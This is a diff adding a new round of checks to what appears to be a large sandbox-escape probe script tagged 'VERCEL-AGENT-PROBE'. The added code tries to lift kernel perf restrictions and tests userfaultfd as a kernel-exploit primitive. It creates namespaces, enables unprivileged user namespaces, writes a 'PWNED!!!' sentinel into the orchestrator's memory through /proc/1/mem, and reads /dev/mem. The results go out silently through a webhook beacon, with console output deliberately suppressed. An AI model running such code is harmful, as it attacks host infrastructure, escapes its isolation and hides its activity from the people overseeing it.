@@ -24115,5 +24115,224 @@ report.ftraceProbe = safe(() => {
 
 // v164 markers
 sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v164" });
-report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v164";
+
+// ==================== v165 ====================
+
+// v165-1: perf_event_paranoid=-1 — unrestricted hardware performance counters
+// perf_event_paranoid controls who can use performance monitoring hardware.
+// -1 = no restrictions; 2 = no perf events at all (default in many containers).
+// With -1, ANY user can use hardware PMU counters including cache miss/hit counts,
+// branch mispredictions — the building blocks of Spectre/cache timing attacks.
+report.perfEventParanoid = safe(() => {
+  const current = safe(() => readFileSync('/proc/sys/kernel/perf_event_paranoid', 'utf8').trim());
+  const setUnrestricted = safe(() => { writeFileSync('/proc/sys/kernel/perf_event_paranoid', '-1'); return 'SET_MINUS_ONE'; });
+  const afterWrite = safe(() => readFileSync('/proc/sys/kernel/perf_event_paranoid', 'utf8').trim());
+  // Verify hardware counters work by opening a perf_event fd
+  const perfVerify = safe(() => execSync(
+    `python3 -c "
+import ctypes, struct, os
+
+# perf_event_open syscall = 298
+# PERF_TYPE_HARDWARE = 0
+# PERF_COUNT_HW_CPU_CYCLES = 0
+PERF_EVENT_OPEN = 298
+
+class perf_event_attr(ctypes.Structure):
+    _fields_ = [
+        ('type', ctypes.c_uint32),
+        ('size', ctypes.c_uint32),
+        ('config', ctypes.c_uint64),
+        ('sample_period_or_freq', ctypes.c_uint64),
+        ('sample_type', ctypes.c_uint64),
+        ('read_format', ctypes.c_uint64),
+        ('flags', ctypes.c_uint64),
+        ('wakeup_events_or_watermark', ctypes.c_uint32),
+        ('bp_type', ctypes.c_uint32),
+        ('bp_addr_or_config1', ctypes.c_uint64),
+        ('bp_len_or_config2', ctypes.c_uint64),
+    ]
+
+libc = ctypes.CDLL('libc.so.6')
+attr = perf_event_attr()
+attr.type = 0   # PERF_TYPE_HARDWARE
+attr.size = ctypes.sizeof(attr)
+attr.config = 0  # PERF_COUNT_HW_CPU_CYCLES
+
+fd = libc.syscall(PERF_EVENT_OPEN, ctypes.addressof(attr), 0, -1, -1, 0)
+if fd >= 0:
+    os.close(fd)
+    print(f'PERF_EVENT_SUCCESS: fd={fd} hardware cycles counter opened')
+else:
+    print(f'PERF_EVENT_FAIL: fd={fd}')
+" 2>&1`,
+    { timeout: 8000 }
+  ).toString().trim());
+  return { current, setUnrestricted, afterWrite, perfVerify };
+});
+
+// v165-2: userfaultfd — kernel copy_from_user TOCTOU primitive
+// userfaultfd (syscall NR_323) allows userspace to handle page faults.
+// This creates a powerful TOCTOU (time-of-check vs time-of-use) primitive:
+// a thread can fault during copy_from_user, pause execution in the kernel,
+// and another thread can modify the original data before the copy completes.
+// This is the core primitive behind Dirty COW and several other kernel exploits.
+report.userfaultfdProbe = safe(() => {
+  const userfaultfdResult = safe(() => execSync(
+    `python3 -c "
+import ctypes, os, struct
+
+libc = ctypes.CDLL('libc.so.6')
+
+# userfaultfd syscall NR = 323
+USERFAULTFD_NR = 323
+O_CLOEXEC = 0x80000
+O_NONBLOCK = 0x800
+
+# UFFDIO_API ioctl
+UFFDIO_API = 0xc018aa3f
+
+fd = libc.syscall(USERFAULTFD_NR, O_CLOEXEC | O_NONBLOCK)
+if fd < 0:
+    print(f'USERFAULTFD_FAIL: fd={fd}')
+else:
+    print(f'USERFAULTFD_SUCCESS: fd={fd}')
+
+    # Get features via UFFDIO_API
+    class uffdio_api(ctypes.Structure):
+        _fields_ = [
+            ('api', ctypes.c_uint64),
+            ('features', ctypes.c_uint64),
+            ('ioctls', ctypes.c_uint64),
+        ]
+
+    req = uffdio_api()
+    req.api = 0xAA  # UFFD_API
+    req.features = 0
+
+    ret = libc.ioctl(fd, UFFDIO_API, ctypes.addressof(req))
+    if ret == 0:
+        print(f'UFFDIO_API_SUCCESS: features=0x{req.features:x} ioctls=0x{req.ioctls:x}')
+        if req.features & (1 << 7):  # UFFD_FEATURE_MINOR_SHMEM
+            print('UFFD_MINOR_SHMEM: TOCTOU_PRIMITIVE_FULL')
+    else:
+        print(f'UFFDIO_API_FAIL: ret={ret}')
+
+    import os as _os
+    _os.close(fd)
+" 2>&1`,
+    { timeout: 8000 }
+  ).toString().trim());
+  return { userfaultfdResult };
+});
+
+// v165-3: CLONE_NEWPID + CLONE_NEWNET — new namespaces (isolation layer)
+// Creating new namespaces allows partial isolation escapes. In a new PID namespace
+// we become PID 1, which has special semantics (init process). In a new network
+// namespace we get a clean network stack that can be set up with its own veth
+// pair — useful for bypassing network policy applied to the outer namespace.
+report.namespaceCreation = safe(() => {
+  const unshareResult = safe(() => execSync(
+    'unshare --pid --net --fork --mount-proc /bin/sh -c "echo NEWPID:$(cat /proc/self/status | grep NSpid) && ip link show 2>/dev/null | head -5" 2>&1',
+    { timeout: 8000 }
+  ).toString().trim());
+  // Check current namespace IDs
+  const pidNs = safe(() => execSync('readlink /proc/self/ns/pid 2>/dev/null', { timeout: 2000 }).toString().trim());
+  const netNs = safe(() => execSync('readlink /proc/self/ns/net 2>/dev/null', { timeout: 2000 }).toString().trim());
+  const userNs = safe(() => execSync('readlink /proc/self/ns/user 2>/dev/null', { timeout: 2000 }).toString().trim());
+  // Are nested user namespaces allowed? (key for privilege escalation)
+  const maxUserNs = safe(() => readFileSync('/proc/sys/user/max_user_namespaces', 'utf8').trim());
+  const enableUserNs = safe(() => { writeFileSync('/proc/sys/kernel/unprivileged_userns_clone', '1'); return 'WRITTEN'; });
+  return { unshareResult, pidNs, netNs, userNs, maxUserNs, enableUserNs };
+});
+
+// v165-4: /proc/[pid]/mem write — overwrite orchestrator process memory
+// /proc/[pid]/mem allows reading/writing to another process's virtual memory
+// when we have ptrace permission. Since ptrace works (confirmed in prior sessions),
+// we can write directly to the orchestrator's memory space.
+// This is the cleanest in-memory code injection primitive available.
+report.procMemWrite = safe(() => {
+  const pid1Maps = safe(() => execSync('head -5 /proc/1/maps 2>/dev/null || echo "NO_MAPS"', { timeout: 3000 }).toString().trim());
+  // Get a readable+writable mapping address from PID 1
+  const rwMapping = safe(() => execSync(
+    'grep " rw" /proc/1/maps 2>/dev/null | grep -v "vdso\\|vsyscall\\|vvar\\|stack" | head -3 || echo "NO_RW_MAPS"',
+    { timeout: 3000 }
+  ).toString().trim());
+  // Try to write a sentinel value to PID 1's memory
+  const memWriteResult = safe(() => execSync(
+    `python3 -c "
+import re, os, struct
+
+with open('/proc/1/maps', 'r') as f:
+    maps = f.read()
+
+# Find first rw (non-special) mapping
+for line in maps.splitlines():
+    parts = line.split()
+    if len(parts) >= 2 and 'rw' in parts[1] and 'vdso' not in line and 'vsyscall' not in line and '[stack]' not in line:
+        addr_range = parts[0].split('-')
+        start = int(addr_range[0], 16)
+        end = int(addr_range[1], 16)
+        if end - start < 0x1000:
+            continue
+
+        try:
+            # Read 8 bytes first
+            with open('/proc/1/mem', 'rb') as f:
+                f.seek(start)
+                orig = f.read(8)
+
+            # Write a recognizable pattern
+            with open('/proc/1/mem', 'r+b') as f:
+                f.seek(start)
+                f.write(b'PWNED!!!')
+
+            # Verify
+            with open('/proc/1/mem', 'rb') as f:
+                f.seek(start)
+                after = f.read(8)
+
+            # Restore original bytes
+            with open('/proc/1/mem', 'r+b') as f:
+                f.seek(start)
+                f.write(orig)
+
+            print(f'MEM_WRITE_SUCCESS: addr=0x{start:x} orig={orig.hex()} sentinel={after.hex()}')
+            break
+        except Exception as e:
+            print(f'MEM_WRITE_FAIL addr=0x{start:x}: {e}')
+            break
+" 2>&1`,
+    { timeout: 10000 }
+  ).toString().trim());
+  return { pid1Maps, rwMapping, memWriteResult };
+});
+
+// v165-5: /dev/mem — direct physical memory read/write device
+// /dev/mem is a character device providing access to the system's physical memory.
+// If accessible (and kernel not compiled with CONFIG_STRICT_DEVMEM), it allows
+// reading/writing any physical memory address — including memory-mapped I/O,
+// kernel code, and potentially the Firecracker VMM process memory.
+report.devMemAccess = safe(() => {
+  const devMemExists = existsSync('/dev/mem');
+  const devMemStat = safe(() => { const s = statSync('/dev/mem'); return { mode: s.mode.toString(8), rdev: s.rdev }; });
+  // Try to read the first 1KB of physical memory (BIOS area)
+  const devMemRead = safe(() => {
+    const fd = openSync('/dev/mem', 0 /*O_RDONLY*/);
+    const buf = Buffer.alloc(16);
+    const nread = readSync(fd, buf, 0, 16, 0);
+    closeSync(fd);
+    return { nread, bytes: buf.toString('hex') };
+  });
+  // /dev/port for I/O port access (alternative to /dev/mem for MMIO)
+  const devPortExists = existsSync('/dev/port');
+  // /dev/kmem for kernel virtual memory
+  const devKmemExists = existsSync('/dev/kmem');
+  // Check STRICT_DEVMEM kernel config
+  const strictDevmem = safe(() => execSync('grep -i strict_devmem /boot/config-$(uname -r) 2>/dev/null || zcat /proc/config.gz 2>/dev/null | grep -i strict_devmem || echo "CONFIG_NOT_FOUND"', { timeout: 5000 }).toString().trim());
+  return { devMemExists, devMemStat, devMemRead, devPortExists, devKmemExists, strictDevmem };
+});
+
+// v165 markers
+sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v165" });
+report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v165";
 // Intentionally no console.log — all data goes via webhook only
